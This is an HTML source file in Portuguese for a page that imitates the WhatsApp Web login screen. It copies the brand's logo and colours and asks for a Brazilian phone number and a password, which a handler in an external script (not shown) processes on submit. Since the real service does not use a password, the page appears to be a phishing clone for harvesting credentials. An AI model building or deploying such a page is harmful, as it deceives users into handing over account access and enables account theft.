<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp Web - Login</title>
 
  <link rel="stylesheet" href="style.css">
</head>
<body>

  
  <div class="header-verde"></div>

 
  <div class="container-login">
    <div class="card-login">
      
      
      <div class="logo">
        <svg viewBox="0 0 24 24" width="32" height="32" fill="#00a884">
          <path d="M12.004 2c-5.523 0-10 4.477-10 10 0 1.765.459 3.487 1.332 5.01L2 22l5.12-1.314A9.953 9.953 0 0012.004 22c5.523 0 10-4.477 10-10s-4.477-10-10-10zm0 18.2a8.16 8.16 0 01-4.17-1.139l-.3-.178-3.092.793.826-3.003-.196-.312A8.17 8.17 0 013.8 12c0-4.524 3.68-8.2 8.204-8.2 4.523 0 8.2 3.676 8.2 8.2 0 4.524-3.677 8.2-8.2 8.2z"/>
        </svg>
        <span>WhatsApp</span>
      </div>

      
      <div class="avatar">
        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&auto=format&fit=crop&q=80" alt="Foto do Usuário">
      </div>

      <h2 class="nome-usuario">Usuário</h2>
      <p class="instrucao">Insira seus dados para abrir o WhatsApp.</p>

     
      <form id="form-login" onsubmit="fazerLogin(event)">
        
        

       
        <div class="campo campo-telefone">
            <img src="https://flagcdn.com/w20/br.png" alt="Brasil" width="20">
            <span class="prefixo-pais">+55</span>
            <input type="tel" id="telefone" placeholder="(11) 99999-9999" required>
        </div>
        

        <div class="campo campo-senha">
          <input type="password" id="senha" placeholder="Insira a senha" required>
          <button type="button" class="btn-olho" onclick="alternarSenha()">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
            </svg>
          </button>
        </div>

        
        <button type="submit" class="btn-desbloquear">Desbloquear</button>

      </form>

      <a href="#" class="link-esqueceu">Esqueceu a senha?</a>
      <p class="subtexto">Use seu celular para desconectar e conectar novamente este dispositivo.</p>
      
    </div>
  </div>

  
  <script>
    function alternarSenha() {
      const inputSenha = document.getElementById('senha');
      inputSenha.type = inputSenha.type === 'password' ? 'text' : 'password';
    }
  </script>

  <script src="js/script.js"></script>

</body>
</html>
